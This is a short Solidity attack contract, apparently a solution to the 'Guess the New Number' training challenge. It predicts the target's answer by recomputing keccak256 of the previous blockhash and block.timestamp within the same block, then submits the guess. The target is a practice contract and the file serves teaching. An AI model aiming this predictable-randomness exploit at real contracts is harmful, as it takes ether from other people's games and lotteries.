// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { GuessTheNewNumberChallenge } from "../challenges/07_GuessTheNewNumber/GuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberAttack {
    function attack(GuessTheNewNumberChallenge target) external payable {
        uint8 answer = getAnswer();
        target.guess{ value: msg.value }(answer);
    }

    function getAnswer() public view returns (uint8) {
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        );
        return answer;
    }

    receive() external payable {}
}
